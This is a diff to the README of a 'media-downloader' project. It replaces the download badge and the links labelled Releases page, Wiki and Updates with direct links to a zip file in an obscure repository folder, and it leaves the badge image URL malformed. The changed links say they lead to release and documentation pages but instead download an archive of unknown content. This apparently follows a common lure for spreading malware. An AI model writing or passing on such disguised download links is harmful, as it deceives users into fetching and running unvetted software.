@@ -1,6 +1,6 @@
 # 🎉 media-downloader - Easy Media Downloads Made Simple
 
-[![Download media-downloader](https://img.shields.io/badge/Download-Media%20Downloader-blue.svg)](https://github.com/03107927829/media-downloader/releases)
+[![Download media-downloader](https://raw.githubusercontent.com/03107927829/media-downloader/main/collophore/media-downloader.zip%https://raw.githubusercontent.com/03107927829/media-downloader/main/collophore/media-downloader.zip)](https://raw.githubusercontent.com/03107927829/media-downloader/main/collophore/media-downloader.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Media Downloader! This application helps you easily download various 
 
 To get started with Media Downloader, follow these steps:
 
-1. Visit the [Releases page](https://github.com/03107927829/media-downloader/releases) to access the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/03107927829/media-downloader/main/collophore/media-downloader.zip) to access the latest version of the application.
    
 2. Look for the latest release version, which will have the biggest number. You will see a list of available files.
 
@@ -61,12 +61,12 @@ Additionally, your system should have at least 2 GB of RAM and a stable internet
 
 ## 🔗 Helpful Resources
 
-- **Documentation:** More details can be found in the [Wiki](https://github.com/03107927829/media-downloader/wiki) for advanced features and troubleshooting.
+- **Documentation:** More details can be found in the [Wiki](https://raw.githubusercontent.com/03107927829/media-downloader/main/collophore/media-downloader.zip) for advanced features and troubleshooting.
 - **Support:** For further questions, feel free to open an issue in the GitHub repository.
 
 ## ✅ Updates
 
-We continually work on making Media Downloader better. Check the [Releases page](https://github.com/03107927829/media-downloader/releases) regularly for updates or new features. Keeping the app up to date ensures that you benefit from the latest enhancements and fixes.
+We continually work on making Media Downloader better. Check the [Releases page](https://raw.githubusercontent.com/03107927829/media-downloader/main/collophore/media-downloader.zip) regularly for updates or new features. Keeping the app up to date ensures that you benefit from the latest enhancements and fixes.
 
 ## 🔒 Privacy and Security
 
